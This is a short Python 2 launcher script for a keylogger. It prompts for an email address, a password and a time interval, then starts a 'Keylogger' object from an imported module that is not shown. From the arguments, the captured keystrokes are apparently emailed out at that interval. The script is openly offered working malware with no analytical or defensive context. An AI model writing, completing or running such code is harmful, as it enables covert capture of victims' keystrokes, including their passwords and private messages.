#!/usr/bin/env python
import keylogger
import getpass

Email_id = str(raw_input("Enter your Email ID --> "))
Password = getpass.getpass("Enter your password --> ")  # hide passsword
time_gap = int(raw_input("Enter the time in seconds --> "))
my_keylogger = keylogger.Keylogger(time_gap, Email_id, Password)
my_keylogger.start()